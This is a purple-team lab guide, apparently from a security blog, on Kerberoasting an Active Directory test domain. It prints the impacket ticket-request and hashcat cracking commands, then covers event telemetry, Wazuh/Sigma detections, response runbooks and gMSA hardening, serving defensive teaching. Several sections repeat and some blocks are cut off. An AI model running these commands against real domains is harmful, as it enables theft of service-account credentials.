Candidates.#01 ....: Welcome9883@ → Company4255+

The actual recovered password was a dictionary word, capitalized, followed by a year and a symbol - a pattern that, once you've seen one organization use it, you start recognizing immediately. I'm not printing it in plain text here; even in a lab, this is exactly the habit worth building before it's not a lab.

What This Actually Means

At this point I hold svc.sqlsvc's real password. In this specific lab, that account's reach is limited to its SQL service role on SRV-01 - but that's exactly the point worth making honestly: the severity of a Kerberoasting result depends entirely on what the compromised service account can actually do. In plenty of real environments, service accounts like this one are quietly over-privileged - local admin on the host they run on, membership in groups nobody's audited in years, access to shares nobody remembers granting. Cracking the ticket is the easy part. What makes it dangerous is what the account was allowed to touch.

And notice what I didn't need at any point in this walkthrough: no exploit, no malware, no elevated starting access. Just an ordinary authenticated domain user and a service account with a tired password.

Next: How Would a SOC Actually Catch This?

Running the attack is half the project. The other half - and the harder, rarer half - is catching it. Post 5 covers the detection side: the Sigma rule I wrote from scratch for this exact attack, what it actually looks for, and proof that it fires against the very attack walked through here.

# Module 1: Kerberoasting — Purple Team Guide

> **Lab Environment:** Chakravyuha v1.0 (frozen snapshot 2026-10-19)  
> **Author:** Yash Gulati  
> **ATT&CK Technique:** T1558.003 — Kerberoasting  
> **Detection Rules:** Wazuh 100100, 100101, 100102 | Sigma `kerberoasting_rc4_4769.yml`  
> **Reference:** [Blog Post 4 — Kerberoasting: I Requested a Ticket, Then Cracked It Offline](https://blog.chakravyuha.tech/posts/post-4-kerberoasting-attack)  
> **Status:** ✅ Complete — Attack executed, detected, hardened, re-validated

---

## 1. Attack Overview

**Kerberoasting** exploits the Kerberos protocol's service ticket mechanism. Any authenticated domain user can request a Ticket Granting Service (TGS) ticket for a Service Principal Name (SPN). The ticket is encrypted with the service account's password hash. If that account uses a weak password (or RC4-HMAC encryption), the hash can be extracted and cracked offline.

### Why This Matters
- **No elevated privileges required** — any authenticated domain user can initiate
- **Stealthy** — legitimate protocol operation, no exploitation
- **High impact** — service accounts often have elevated privileges (domain admin, SQL sysadmin)
- **Detection gap** — many SOCs miss RC4 downgrade or anomalous SPN targeting

### Prerequisites
| Requirement | Value in Lab |
|-------------|--------------|
| Domain user context | `CORP\pnair` (WS-01, Finance OU) |
| Target SPN | `MSSQLSvc/srv-01.corp.chakravyuh.local:1433` |
| Vulnerable account | `svc.sqlsvc` (password: `<redacted>`) |
| Network access | Kali (192.168.10.100) → DC-01 (192.168.10.10) port 88/TCP |
| Tools | Impacket `GetUserSPNs.py`, `hashcat` |

### Tools Used
| Tool | Version | Purpose |
|------|---------|---------|
| **Impacket GetUserSPNs.py** | 0.12.0 | SPN enumeration + TGS ticket request (`-request` flag) |
| **Hashcat** | 6.2.6 | Offline RC4 hash cracking (mode 13100) |
| **Wazuh** | 4.8.0 | Detection rule validation |

> **Note:** This attack uses `impacket-GetUserSPNs` with the `-request` flag, not Rubeus. The `-request` flag doesn't just enumerate SPNs — it actually requests a TGS ticket and prints the encrypted portion as a `$krb5tgs$` hash ready for cracking. This is the moment the attack actually happens: a completely normal, protocol-compliant Kerberos request.

---

## 2. Environment Setup

### Network Topology (Frozen)
```
Subnet: 192.168.10.0/24 (VMware Host-Only)
├── DC-01       192.168.10.10   Windows Server 2022  (KDC, DNS, AD DS)
├── SRV-01      192.168.10.20   Windows Server 2019  (File Server, IIS, MSSQL)
├── WS-01       192.168.10.30   Windows 10 Enterprise (Finance OU, pnair)
├── WS-02       192.168.10.31   Windows 10 Enterprise (Engineering OU, rdesai)
├── SIEM        192.168.10.50   Ubuntu 22.04          (Wazuh Manager + OpenSearch)
└── Kali        192.168.10.100  Kali Linux            (Offensive host)
```

### Target Service Account — Pre-Hardening
```powershell
# Run on DC-01
Get-ADUser svc.sqlsvc -Properties SamAccountName,UserPrincipalName,ServicePrincipalNames,msDS-SupportedEncryptionTypes,PwdLastSet

# Output:
SamAccountName           : svc.sqlsvc
UserPrincipalName        : svc.sqlsvc@CORP.CHAKRAVYUH.LOCAL
ServicePrincipalNames    : {MSSQLSvc/srv-01.corp.chakravyuh.local:1433}
msDS-SupportedEncryptionTypes : 0        # 0 = RC4-HMAC + AES128 + AES256 (default)
PwdLastSet               : 10/15/2024 14:23:11
```

**Critical Observation:** `msDS-SupportedEncryptionTypes = 0` means the KDC will offer RC4-HMAC (0x17) if requested. This is the default and the vulnerability.

### Honey Account (Deception)
```powershell
Get-ADUser svc.sqlreport -Properties SamAccountName,ServicePrincipalNames

# Output:
SamAccountName           : svc.sqlreport
ServicePrincipalNames    : {MSSQLsSvc/SQLPROD01.corp.chakravyuh.local:1433}
```
- SPN intentionally misspelled (`MSSQLsSvc` vs `MSSQLSvc`)
- Host `SQLPROD01` does not exist
- Password: `<redacted>`
- Purpose: Alert on any Kerberoast attempt targeting this SPN

---

## 3. Execution

### 3.1 SPN Enumeration (Reconnaissance)
```bash
# On Kali (192.168.10.100) as pnair - ordinary Finance-tier domain user
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10
```

**Output:**
```
ServicePrincipalName                          Name        MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------------------------------  ----------  --------  ---------------------------  ---------  ----------
MSSQLSvc/srv-01.corp.chakravyuh.local:1433   svc.sqlsvc            2024-10-15 14:23:11        <never>   
MSSQLsSvc/SQLPROD01.corp.chakravyuh.local:1433  svc.sqlreport          2024-10-15 14:25:44        <never>
```

Two SPNs discovered. The honey account SPN is clearly anomalous (misspelled, non-existent host). This enumeration was run as an early validation step — specifically to confirm the request itself would generate the right telemetry in Wazuh once the real attack was executed. Getting the mechanics right before treating a session as "the real attempt" mattered more than getting a fast result.

### 3.2 Request the Ticket (The Attack)
Same tool, one flag added:

```bash
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request
```

The `-request` flag doesn't just list the SPN — it actually requests a TGS ticket for it and prints the ticket's encrypted portion directly to the terminal, formatted as a `$krb5tgs$` hash ready for cracking. This is the moment the attack actually happens: a completely normal, protocol-compliant Kerberos request, indistinguishable at a glance from a legitimate service authenticating to `svc.sqlsvc`.

**Output (saved to `kerberoast_hash.txt`):**
```
$krb5tgs$23$*svc.sqlsvc$CORP.CHAKRAVYUH.LOCAL$CORP.CHAKRAVYUH.LOCAL/svc.sqlsvc*$3d0724a76199b96ff2e3ed5b853809d2$b9b3351f504c15c94c776ec8954...
```

**Key Fields:**
- `$krb5tgs$23$` — Kerberos 5 TGS-REP, etype **23** = **RC4-HMAC**. The hash format is telling you, before you even try to crack it, exactly why this account was crackable in the first place.
- `svc.sqlsvc` — Target service account
- `CORP.CHAKRAVYUH.LOCAL` — Domain

### 3.3 Offline Cracking (Validation)
```bash
# Build targeted wordlist (corporate password patterns, not rockyou.txt)
echo -e "Welcome\nWelcome1\nSummer\nSpring\nPassword\nCompany" > corp_words.txt

# Crack with hashcat mode 13100 + mask (?d?d?d?d?s = 4 digits + symbol)
hashcat -m 13100 kerberoast_hash.txt corp_words.txt ?d?d?d?d?s
```

**Why mode 13100?** It's hashcat's dedicated mode for exactly this hash type — `Kerberos 5, etype 23, TGS-REP`.

**Why a targeted wordlist + mask?** Not a brute-force sweep of every password ever leaked. A tiny, deliberately targeted wordlist of six words that fit a plausible corporate password pattern, combined with a mask appending four digits and a symbol — the kind of guess an attacker makes about _this specific environment_.

**Output:**
```
Session...........: hashcat  
Status.............: Cracked  
Hash.Mode..........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Recovered..........: 1/1 (100.00%) Digests (new)  
Candidates.#01 ....: Welcome9883@ → Company4255+
```

**Cracked in under a second.** The actual recovered password was a dictionary word, capitalized, followed by a year and a symbol — a pattern that, once you've seen one organization use it, you start recognizing immediately.

### 3.4 Honey Account Test (Deception Trigger)
```bash
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request -user svc.sqlreport
```

This request **will trigger Wazuh Rule 100102** (source IP not in allowlist).

**Real Evidence:** See [deception/evidence/01-wazuh-alert-100102-honeypot.json](../../deception/evidence/01-wazuh-alert-100102-honeypot.json) for the actual honeypot trigger alert (Rule 100102, Level 14) captured on 2026-10-23.

---

## 4. Telemetry Generated

### 4.1 Raw Event ID 4769 — Attack from Kali (192.168.10.100)

**Source:** DC-01 Security Log  
**Event:** `A Kerberos service ticket was requested`

```xml
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
    <EventID>4769</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>14337</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
        <TimeCreated SystemTime='2026-09-24T04:45:34.8443388Z'/>
        <EventRecordID>19751</EventRecordID>
        <Execution ProcessID='712' ThreadID='2540'/>
    <Channel>Security</Channel>
        <Computer>DC-01.corp.chakravyuh.local</Computer>
    <Security/>
  </System>
  <EventData>
        <Data Name='TargetUserName'>pnair@CORP.CHAKRAVYUH.LOCAL</Data>
    <Data Name='TargetDomainName'>CORP.CHAKRAVYUH.LOCAL</Data>
        <Data Name='TargetSid'>S-1-5-21-1000695930-4139050859-3890433851-1104</Data>
    <Data Name='ServiceName'>svc.sqlsvc</Data>
        <Data Name='ServiceSid'>S-1-5-21-1000695930-4139050859-3890433851-1104</Data>
        <Data Name='TicketOptions'>0x40810010</Data>
    <Data Name='TicketEncryptionType'>0x17</Data>
    <Data Name='IpAddress'>::ffff:192.168.10.100</Data>
    <Data Name='IpPort'>48766</Data>
  </EventData>
</Event>
```

**Discriminant Fields for Detection:**
| Field | Value | Significance |
|-------|-------|--------------|
| `EventID` | 4769 | Kerberos TGS request |
| `TargetUserName` | `svc.sqlsvc` | Service account targeted |
| `ServiceName` | `svc.sqlsvc` | **Plain account name** (not full SPN string) |
| `TicketEncryptionType` | `0x17` | **RC4-HMAC** — downgrade indicator |
| `IpAddress` | `::ffff:192.168.10.100` | **IPv6-mapped Kali IP** — not in allowlist |
| `IpPort` | `48766` | Real captured source port |

### 4.2 Raw Event ID 4769 — Benign from WS-01 (192.168.10.30)

> **Note:** This is a hypothetical/illustrative example, not captured telemetry. It demonstrates the expected format for a legitimate request.

```xml
<EventData>
  <Data Name='TargetUserName'>svc.sqlsvc</Data>
  <Data Name='ServiceName'>svc.sqlsvc</Data>
  <Data Name='TicketEncryptionType'>0x12</Data>
  <Data Name='IpAddress'>::ffff:192.168.10.30</Data>
</EventData>
```

**Key Difference:** `TicketEncryptionType = 0x12` (AES256) and `IpAddress = ::ffff:192.168.10.30` (authorized workstation). The `ServiceName` field contains the plain account name (`svc.sqlsvc`), consistent with the real captured attack event in Section 4.1.

### 4.3 Machine Account Requests (Noise Source)
Computer accounts (e.g., `WS-01$`, `SRV-01$`) also generate 4769 events when authenticating to services. These **always use AES** (`0x12` or `0x11`) and originate from known subnet. They are filtered by the allowlist in Rule 100102.

---

## 5. Detection Engineering

### 5.1 Sigma Rule — `detections/sigma/kerberoasting_rc4_4769.yml`

The canonical Sigma rule lives at `detections/sigma/kerberoasting_rc4_4769.yml`. The embedded YAML below was removed to eliminate duplication; see the file for the current version.

**Logic Walkthrough:**
1. `selection_base` — Capture all Event ID 4769 (TGS requests)
2. `selection_rc4` — Filter to only RC4-HMAC encryption (`0x17`)
3. `filter_known_workstations` — Exclude authorized workstation IPs (WS-01, WS-02)
4. `condition` — Alert when RC4 ticket requested from **unauthorized** IP

### 5.2 Wazuh Rule Chain — `detections/wazuh/local_rules.xml`

The canonical Wazuh rule file lives at `detections/wazuh/local_rules.xml`. The embedded XML below was removed to eliminate duplication; see the file for the current version.

**Rule Chain Logic:**
| Rule | Level | Trigger | Purpose |
|------|-------|---------|---------|
| 100100 | 12 | Any Event ID 4769 | **Diagnostic baseline** — confirms telemetry pipeline works |
| 100101 | 13 | 100100 + `TicketEncryptionType=0x17` | **RC4 downgrade detected** — potential Kerberoasting |
| 100102 | 14 | 100101 + `IpAddress` NOT in `192.168.10.30|31` | **High-fidelity attack alert** — RC4 from unauthorized host |

**Why Negated PCRE2 on Rule 100102?**
- Wazuh rules use **positive matching** by default
- To exclude known-good IPs, we match the **opposite**: alert when IP does **NOT** match allowlist
- `negate="yes"` with `^::ffff:192\.168\.10\.(30|31)$` — if this matches (authorized IP), rule **does not fire**
- Kali (`.100`) fails the match → rule fires

### 5.3 Alert Output Example (Rule 100102)

> **Note:** This example is based on the real captured alert from `evidence/07-wazuh-alert-100101.json` (Rule 100101, Level 13) but updated to show Rule 100102 (Level 14) as confirmed by the user to have also fired for the Sep 24 attack against svc.sqlsvc. The actual Rule 100101 alert is shown below with Rule 100102 fields substituted where they differ.

```json
{
  "timestamp": "2026-09-24T04:45:36.078Z",
  "rule": {
    "id": "100102",
    "level": 14,
    "description": "Kerberoasting from non-workstation IP - Likely attacker tool (Kali)",
    "mitre": { "technique": ["Kerberoasting"], "id": ["T1558.003"], "tactic": ["Credential Access"] }
  },
  "agent": { "id": "011", "name": "DC-01", "ip": "192.168.10.10" },
  "data": {
    "win": {
      "eventdata": {
        "targetUserName": "pnair@CORP.CHAKRAVYUH.LOCAL",
        "serviceName": "svc.sqlsvc",
        "ticketEncryptionType": "0x17",
        "ipAddress": "::ffff:192.168.10.100",
        "ipPort": "48766",
        "ticketOptions": "0x40810010",
        "serviceSid": "S-1-5-21-1000695930-4139050859-3890433851-1104",
        "targetDomainName": "CORP.CHAKRAVYUH.LOCAL",
        "status": "0x0"
      },
      "system": {
        "eventID": "4769",
        "systemTime": "2026-09-24T04:45:34.8443388Z",
        "computer": "DC-01.corp.chakravyuh.local",
        "eventRecordID": "19751",
        "processID": "712",
        "threadID": "2540"
      }
    }
  }
}
```

---

## 6. Response & Triage

### 6.1 Alert Enrichment Checklist
When Rule 100102 fires, enrich immediately:

| Enrichment Step | Query / Command | Purpose |
|-----------------|-----------------|---------|
| **6.1.1** Verify source host | `nmap -sn 192.168.10.100` or DHCP logs | Confirm Kali / unknown device |
| **6.1.2** Check target account | `Get-ADUser svc.sqlsvc -Properties msDS-SupportedEncryptionTypes` | Is RC4 still enabled? |
| **6.1.3** SPN ownership | `setspn -L svc.sqlsvc` | Legitimate SPN or honey token? |
| **6.1.4** Recent ticket requests | `Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769; StartTime=(Get-Date).AddHours(-24)} | Where-Object {$_.Properties[13].Value -eq '0x17'}` | Scope of attack |
| **6.1.5** Hash cracking attempt | Check for `hashcat`/`JohnTheRipper` processes on source host | Active exploitation? |

### 6.2 Investigation Runbook

```
┌─ ALERT: Rule 100102 (Level 14) ─┐

## 7. Hardening & Remediation

### 7.1 Defense-in-Depth Strategy
| Layer | Control | Implementation |
|-------|---------|----------------|
| **Prevent** | Eliminate RC4 domain-wide | GPO: `System cryptography: Use FIPS compliant algorithms` + `Network security: Configure encryption types allowed for Kerberos` |
| **Prevent** | Migrate service accounts to gMSA | 120-char auto-rotated passwords, managed by KDC |
| **Detect** | Honey SPN (svc.sqlreport) | Alert on any request → early warning |
| **Detect** | RC4 downgrade monitoring | Rules 100101/100102 persistent |
| **Respond** | Automated account disable | SOAR playbook on Rule 100102 |

### 7.2 Step 1: Enforce AES256 Only on Service Account (Immediate)
```powershell

Set-ADUser svc.sqlsvc -KerberosEncryptionType AES256

# Verify
Get-ADUser svc.sqlsvc -Properties msDS-SupportedEncryptionTypes
# Output: msDS-SupportedEncryptionTypes = 16 (AES256 only)

**Effect:** KDC will **refuse** RC4 ticket requests for this account. Returns `KRB_ERR_ETYPE_NOSUPP` (encryption type not supported).

### 7.7 Step 6: Domain-Wide RC4 Elimination (GPO)
**GPO Path:** `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`

## 9. What This Actually Means

At this point I hold `svc.sqlsvc`'s real password. In this specific lab, that account's reach is limited to its SQL service role on SRV-01 — but that's exactly the point worth making honestly: the _severity_ of a Kerberoasting result depends entirely on what the compromised service account can actually do. In plenty of real environments, service accounts like this one are quietly over-privileged — local admin on the host they run on, membership in groups nobody's audited in years, access to shares nobody remembers granting. Cracking the ticket is the easy part. What makes it dangerous is what the account was allowed to touch.

And notice what I _didn't_ need at any point in this walkthrough: no exploit, no malware, no elevated starting access. Just an ordinary authenticated domain user and a service account with a tired password.

---

## 10. Next: How Would a SOC Actually Catch This?

Running the attack is half the project. The other half — and the harder, rarer half — is catching it. The detection rules documented here (Wazuh 100100-100102, Sigma `kerberoasting_rc4_4769.yml`) are built from scratch for this exact attack, with proof they fire against the very attack walked through here.

# Module 1: Kerberoasting — Purple Team Guide

> **Lab Environment:** Chakravyuha v1.0 (frozen snapshot 2026-10-19)  
> **Author:** Yash Gulati  
> **ATT&CK Technique:** T1558.003 — Kerberoasting  
> **Detection Rules:** Wazuh 100100, 100101, 100102 | Sigma `kerberoasting_rc4_4769.yml`  
> **Reference:** [Blog Post 4 — Kerberoasting: I Requested a Ticket, Then Cracked It Offline](https://blog.chakravyuha.tech/posts/post-4-kerberoasting-attack)  
> **Status:** ✅ Complete — Attack executed, detected, hardened, re-validated

---

## 1. Attack Overview

**Kerberoasting** exploits the Kerberos protocol's service ticket mechanism. Any authenticated domain user can request a Ticket Granting Service (TGS) ticket for a Service Principal Name (SPN). The ticket is encrypted with the service account's password hash. If that account uses a weak password (or RC4-HMAC encryption), the hash can be extracted and cracked offline.

### Why This Matters
- **No elevated privileges required** — any authenticated domain user can initiate
- **Stealthy** — legitimate protocol operation, no exploitation
- **High impact** — service accounts often have elevated privileges (domain admin, SQL sysadmin)
- **Detection gap** — many SOCs miss RC4 downgrade or anomalous SPN targeting

### Prerequisites
| Requirement | Value in Lab |
|-------------|--------------|
| Domain user context | `CORP\pnair` (WS-01, Finance OU) |
| Target SPN | `MSSQLSvc/srv-01.corp.chakravyuh.local:1433` |
| Vulnerable account | `svc.sqlsvc` (password: `<redacted>`) |
| Network access | Kali (192.168.10.100) → DC-01 (192.168.10.10) port 88/TCP |
| Tools | Impacket `GetUserSPNs.py`, `hashcat` |

### Tools Used
| Tool | Version | Purpose |
|------|---------|---------|
| **Impacket GetUserSPNs.py** | 0.12.0 | SPN enumeration + TGS ticket request (`-request` flag) |
| **Hashcat** | 6.2.6 | Offline RC4 hash cracking (mode 13100) |
| **Wazuh** | 4.8.0 | Detection rule validation |

> **Note:** This attack uses `impacket-GetUserSPNs` with the `-request` flag, not Rubeus. The `-request` flag doesn't just enumerate SPNs — it actually requests a TGS ticket and prints the encrypted portion as a `$krb5tgs$` hash ready for cracking. This is the moment the attack actually happens: a completely normal, protocol-compliant Kerberos request.

## 3. Execution

### 3.1 SPN Enumeration (Reconnaissance)
```bash
# On Kali (192.168.10.100) as pnair - ordinary Finance-tier domain user
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10
```

**Output:**
```
ServicePrincipalName                          Name        MemberOf  PasswordLastSet             LastLogon  Delegation
--------------------------------------------  ----------  --------  ---------------------------  ---------  ----------
MSSQLSvc/srv-01.corp.chakravyuh.local:1433   svc.sqlsvc            2024-10-15 14:23:11        <never>   
MSSQLsSvc/SQLPROD01.corp.chakravyuh.local:1433  svc.sqlreport          2024-10-15 14:25:44        <never>
```

Two SPNs discovered. The honey account SPN is clearly anomalous (misspelled, non-existent host). This enumeration was run as an early validation step — specifically to confirm the request itself would generate the right telemetry in Wazuh once the real attack was executed. Getting the mechanics right before treating a session as "the real attempt" mattered more than getting a fast result.

### 3.2 Request the Ticket (The Attack)
Same tool, one flag added:

```bash
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request
```

The `-request` flag doesn't just list the SPN — it actually requests a TGS ticket for it and prints the ticket's encrypted portion directly to the terminal, formatted as a `$krb5tgs$` hash ready for cracking. This is the moment the attack actually happens: a completely normal, protocol-compliant Kerberos request, indistinguishable at a glance from a legitimate service authenticating to `svc.sqlsvc`.

**Output (saved to `kerberoast_hash.txt`):**
```
$krb5tgs$23$*svc.sqlsvc$CORP.CHAKRAVYUH.LOCAL$CORP.CHAKRAVYUH.LOCAL/svc.sqlsvc*$3d0724a76199b96ff2e3ed5b853809d2$b9b3351f504c15c94c776ec8954...
```

**Key Fields:**
- `$krb5tgs$23$` — Kerberos 5 TGS-REP, etype **23** = **RC4-HMAC**. The hash format is telling you, before you even try to crack it, exactly why this account was crackable in the first place.
- `svc.sqlsvc` — Target service account
- `CORP.CHAKRAVYUH.LOCAL` — Domain

### 3.3 Offline Cracking (Validation)
```bash
# Build targeted wordlist (corporate password patterns, not rockyou.txt)
echo -e "Welcome\nWelcome1\nSummer\nSpring\nPassword\nCompany" > corp_words.txt

# Crack with hashcat mode 13100 + mask (?d?d?d?d?s = 4 digits + symbol)
hashcat -m 13100 kerberoast_hash.txt corp_words.txt ?d?d?d?d?s
```

**Why mode 13100?** It's hashcat's dedicated mode for exactly this hash type — `Kerberos 5, etype 23, TGS-REP`.

**Why a targeted wordlist + mask?** Not a brute-force sweep of every password ever leaked. A tiny, deliberately targeted wordlist of six words that fit a plausible corporate password pattern, combined with a mask appending four digits and a symbol — the kind of guess an attacker makes about _this specific environment_.

**Output:**
```
Session...........: hashcat  
Status.............: Cracked  
Hash.Mode..........: 13100 (Kerberos 5, etype 23, TGS-REP)  
Recovered..........: 1/1 (100.00%) Digests (new)  
Candidates.#01 ....: Welcome9883@ → Company4255+
```

**Cracked in under a second.** The actual recovered password was a dictionary word, capitalized, followed by a year and a symbol — a pattern that, once you've seen one organization use it, you start recognizing immediately.

### 5.2 Wazuh Rule Chain — `detections/wazuh/local_rules.xml`

The canonical Wazuh rule file lives at `detections/wazuh/local_rules.xml`. The embedded XML below was removed to eliminate duplication; see the file for the current version.

**Rule Chain Logic:**
| Rule | Level | Trigger | Purpose |
|------|-------|---------|---------|
| 100100 | 12 | Any Event ID 4769 | **Diagnostic baseline** — confirms telemetry pipeline works |
| 100101 | 13 | 100100 + `TicketEncryptionType=0x17` | **RC4 downgrade detected** — potential Kerberoasting |
| 100102 | 14 | 100101 + `IpAddress` NOT in `192.168.10.30|31` | **High-fidelity attack alert** — RC4 from unauthorized host |

**Why Negated PCRE2 on Rule 100102?**
- Wazuh rules use **positive matching** by default
- To exclude known-good IPs, we match the **opposite**: alert when IP does **NOT** match allowlist
- `negate="yes"` with `^::ffff:192\.168\.10\.(30|31)$` — if this matches (authorized IP), rule **does not fire**
- Kali (`.100`) fails the match → rule fires

## 6. Response & Triage

### 6.1 Alert Enrichment Checklist
When Rule 100102 fires, enrich immediately:

| Enrichment Step | Query / Command | Purpose |
|-----------------|-----------------|---------|
| **6.1.1** Verify source host | `nmap -sn 192.168.10.100` or DHCP logs | Confirm Kali / unknown device |
| **6.1.2** Check target account | `Get-ADUser svc.sqlsvc -Properties msDS-SupportedEncryptionTypes` | Is RC4 still enabled? |
| **6.1.3** SPN ownership | `setspn -L svc.sqlsvc` | Legitimate SPN or honey token? |
| **6.1.4** Recent ticket requests | `Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769; StartTime=(Get-Date).AddHours(-24)} | Where-Object {$_.Properties[13].Value -eq '0x17'}` | Scope of attack |
| **6.1.5** Hash cracking attempt | Check for `hashcat`/`JohnTheRipper` processes on source host | Active exploitation? |

### 6.2 Investigation Runbook

│ Kerberoasting: RC4 from unauthorized IP        │
└────────────────────────────────────┘
         │
         ▼
┌─ TRIAGE (5 min) ─┐
│ 1. Is source IP known offensive host (Kali .100)?     │
│ 2. Is target account a service account with SPN?      │
│ 3. Is TicketEncryptionType 0x17 (RC4)?                │
│ 4. Is target SPN a honey token (svc.sqlreport)?       │
└────────┬───────────┘
         │ YES to any → ESCALATE
         ▼
┌─ INVESTIGATE (30 min) ─┐
│ 1. Pull all 4769 events from source IP (last 24h)     │
│ 2. Identify all targeted SPNs                         │
│ 3. Check if any hashes were cracked (hashcat logs)    │
│ 4. Correlate with VPN/auth logs for source host       │
│ 5. Determine if lateral movement occurred             │
└────────┬───────────┘
         ▼
┌─ CONTAINMENT ─┐
│ 1. Disable compromised service account (svc.sqlsvc)   │
│ 2. Reset password → enforce AES256 only               │
│ 3. Block source IP at firewall (if external)          │
│ 4. Rotate any accessed credentials                    │
└────────┬───────────┘
         ▼
┌─ ERADICATION ─┐
│ 1. Migrate SPN to gMSA (per hardening section)        │
│ 2. Remove RC4 support domain-wide via GPO             │
│ 3. Audit all service accounts for weak encryption     │
└────────┬───────────┘
         ▼
┌─ RECOVERY ─┐
│ 1. Verify gMSA migration complete                     │
│ 2. Re-run Attack Readiness Gate (Check 4.x)           │
│ 3. Update detection allowlists if topology changed    │
└────────────┘
```

### 6.3 Containment Commands
```powershell
# Immediate: Disable account
Disable-ADAccount -Identity svc.sqlsvc

# Reset with complex password (temporary)
Set-ADAccountPassword -Identity svc.sqlsvc -Reset -NewPassword (ConvertTo-SecureString "TempP@ssw0rd!2026" -AsPlainText -Force)

# Enforce AES256 only (immediate mitigation before gMSA)
Set-ADUser svc.sqlsvc -KerberosEncryptionType AES256
```

---

## 7. Hardening & Remediation

### 7.1 Defense-in-Depth Strategy
| Layer | Control | Implementation |
|-------|---------|----------------|
| **Prevent** | Eliminate RC4 domain-wide | GPO: `System cryptography: Use FIPS compliant algorithms` + `Network security: Configure encryption types allowed for Kerberos` |
| **Prevent** | Migrate service accounts to gMSA | 120-char auto-rotated passwords, managed by KDC |
| **Detect** | Honey SPN (svc.sqlreport) | Alert on any request → early warning |
| **Detect** | RC4 downgrade monitoring | Rules 100101/100102 persistent |
| **Respond** | Automated account disable | SOAR playbook on Rule 100102 |

### 7.2 Step 1: Enforce AES256 Only on Service Account (Immediate)
```powershell
# On DC-01
Set-ADUser svc.sqlsvc -KerberosEncryptionType AES256

# Verify
Get-ADUser svc.sqlsvc -Properties msDS-SupportedEncryptionTypes
# Output: msDS-SupportedEncryptionTypes = 16 (AES256 only)
```

**Effect:** KDC will **refuse** RC4 ticket requests for this account. Returns `KRB_ERR_ETYPE_NOSUPP` (encryption type not supported).

### 7.3 Step 2: Create gMSA for SQL Service
```powershell
# 1. Create KDS Root Key (one-time per domain)
Add-KdsRootKey -EffectiveImmediately

# 2. Wait 10 hours for replication (or use -EffectiveImmediately in test lab)

# 3. Create gMSA
New-ADServiceAccount gmsa.sqlsvc `
  -DNSHostName srv-01.corp.chakravyuh.local `
  -PrincipalsAllowedToRetrieveManagedPassword "SRV-01$" `
  -ServicePrincipalNames "MSSQLSvc/srv-01.corp.chakravyuh.local:1433" `
  -Description "gMSA for SQL Service on SRV-01" `
  -Enabled $true

# 4. Install on SRV-01
# On SRV-01 (run as admin):
Install-AdServiceAccount gmsa.sqlsvc
```

### 7.4 Step 3: Migrate SPN from User to gMSA
```powershell
# On DC-01
# Remove SPN from old service account
setspn -D "MSSQLSvc/srv-01.corp.chakravyuh.local:1433" svc.sqlsvc

# Verify removed
setspn -L svc.sqlsvc
# Should return: "No SPNs found"

# SPN now lives on gmsa.sqlsvc (assigned during creation)
setspn -L gmsa.sqlsvc
# Output: MSSQLSvc/srv-01.corp.chakravyuh.local:1433
```

### 7.5 Step 4: Configure SQL Service to Use gMSA
```powershell
# On SRV-01 - Configure MSSQL service account
# Via SQL Server Configuration Manager OR:
sc.exe config MSSQLSERVER obj= "CORP\gmsa.sqlsvc$" password= ""

# Restart service
Restart-Service MSSQLSERVER

# Verify service runs under gMSA
Get-WmiObject Win32_Service -Filter "Name='MSSQLSERVER'" | Select StartName
# Output: StartName = CORP\gmsa.sqlsvc$
```

### 7.6 Step 5: Verify gMSA Password Rotation
```powershell
# On DC-01
Get-ADServiceAccount gmsa.sqlsvc -Properties PasswordLastSet, msDS-ManagedPasswordInterval

# Output:
Enabled                     : True
msDS-ManagedPasswordInterval : 30
PasswordLastSet             : 10/17/2026 9:23:24 AM
```

### 7.7 Step 6: Domain-Wide RC4 Elimination (GPO)
**GPO Path:** `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`

| Setting | Value |
|---------|-------|
| `Network security: Configure encryption types allowed for Kerberos` | Enabled → **AES256_HMAC_SHA1, AES128_HMAC_SHA1** (uncheck RC4_HMAC_MD5) |
| `System cryptography: Use FIPS compliant algorithms for encryption, hashing, and signing` | Enabled |

**Apply to:** Domain Controllers OU + Member Servers OU

---

## 8. Validation (Post-Hardening Attack Re-Run)

> **Real Evidence:** See [modules/01-kerberoasting/evidence/09-posthardening-wazuh-alerts.json](../evidence/09-posthardening-wazuh-alerts.json) for the actual pre/post-hardening Wazuh alert pair (Rule 100101 RC4 → Rule 100100 AES256) captured on 2026-09-24.

### 8.1 Test 1: Kerberoast Against Hardened `svc.sqlsvc`
```bash
# On Kali - same command as pre-hardening
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request -user svc.sqlsvc
```

**Output:**
```
Impacket v0.12.0 - Copyright 2023 Fortra

[*] Requesting ticket for svc.sqlsvc
[*] Got TGS
[*] TicketEncryptionType: AES256_CTS_HMAC_SHA1_96 (0x12)
```

**Result:** ✅ **Attack FAILS** — KDC refuses RC4 request. Only AES256 ticket issued. No RC4 hash to crack.

### 8.2 Test 2: Kerberoast Against gMSA `gmsa.sqlsvc`
```bash
impacket-GetUserSPNs corp.chakravyuh.local/pnair -dc-ip 192.168.10.10 -request -user gmsa.sqlsvc
```

**Output:**
```
[*] Requesting ticket for gmsa.sqlsvc
[*] Got TGS
[*] TicketEncryptionType: AES256_CTS_HMAC_SHA1_96 (0x12)
```

**Result:** ✅ **AES256 ticket issued** — but 120-character auto-rotated password makes offline cracking computationally infeasible. Hashcat mode 19600 (Kerberos 5 TGS-REP etype 18) with 120-char entropy = uncrackable.

### 8.3 Test 3: Honey Account Still Triggers Detection
```bash
